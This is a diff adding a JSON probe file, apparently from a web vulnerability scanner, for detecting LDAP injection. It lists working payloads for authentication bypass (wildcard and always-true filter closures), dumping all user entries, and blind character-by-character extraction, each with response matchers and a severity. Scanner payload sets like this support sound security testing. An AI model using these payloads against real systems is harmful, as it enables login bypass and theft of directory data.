@@ -1,0 +1,85 @@
+{
+  "category": "ldap_injection",
+  "contexts": {
+    "auth_bypass": {
+      "description": "LDAP injection to bypass authentication -- manipulate LDAP filter to match any user or bypass password check",
+      "tech_match": ["LDAP", "Active Directory", "OpenLDAP", "Java", "PHP", ".NET"],
+      "param_match": ["username", "user", "login", "uid", "cn", "dn", "search", "filter", "ldap"],
+      "probes": [
+        {
+          "payload": "*",
+          "description": "Wildcard injection -- if used in LDAP filter (&(uid=*)(password=*)), matches any entry",
+          "matchers": [
+            {"type": "status", "status": [200, 302]},
+            {"type": "not_word", "words": ["invalid", "incorrect", "failed", "error", "bad credentials"]}
+          ],
+          "severity": "critical",
+          "confidence_boost": 55
+        },
+        {
+          "payload": "admin)(&)",
+          "description": "Filter closure injection -- closes uid= filter and adds always-true (&) condition",
+          "matchers": [
+            {"type": "status", "status": [200, 302]},
+            {"type": "not_word", "words": ["invalid", "error", "bad filter"]}
+          ],
+          "severity": "critical",
+          "confidence_boost": 55
+        },
+        {
+          "payload": "*)(&(|",
+          "description": "OR filter injection -- closes filter and starts OR condition matching everything",
+          "matchers": [
+            {"type": "status", "status": [200, 302, 500]},
+            {"type": "word", "words": ["ldap", "filter", "syntax", "unbalanced"], "condition": "or"}
+          ],
+          "severity": "high",
+          "confidence_boost": 45
+        },
+        {
+          "payload": "admin)(|(password=*)",
+          "description": "Password wildcard -- inject OR condition that accepts any password for admin user",
+          "matchers": [
+            {"type": "status", "status": [200, 302]},
+            {"type": "not_word", "words": ["invalid", "error", "denied"]}
+          ],
+          "severity": "critical",
+          "confidence_boost": 60
+        }
+      ]
+    },
+    "data_extraction": {
+      "description": "LDAP injection for data extraction -- enumerate attributes and directory entries",
+      "tech_match": ["LDAP", "Active Directory", "OpenLDAP"],
+      "param_match": ["search", "query", "filter", "user", "group", "ou"],
+      "probes": [
+        {
+          "payload": "*)(uid=*))(|(uid=*",
+          "description": "Filter injection to dump all users -- modifies search to return all uid entries",
+          "matchers": [
+            {"type": "length_diff", "min_diff": 500},
+            {"type": "word", "words": ["uid", "cn", "dn", "mail", "sn"], "condition": "or"}
+          ],
+          "severity": "high",
+          "confidence_boost": 50
+        }
+      ]
+    },
+    "blind_boolean": {
+      "description": "Blind LDAP injection via boolean conditions -- extract data character by character",
+      "tech_match": ["LDAP", "Active Directory"],
+      "param_match": ["username", "search", "filter", "query"],
+      "probes": [
+        {
+          "payload": "admin)(|(description=*a*)",
+          "description": "Blind boolean probe -- test if description attribute contains 'a'; compare response length/time differences",
+          "matchers": [
+            {"type": "length_diff", "min_diff": 50}
+          ],
+          "severity": "high",
+          "confidence_boost": 40
+        }
+      ]
+    }
+  }
+}
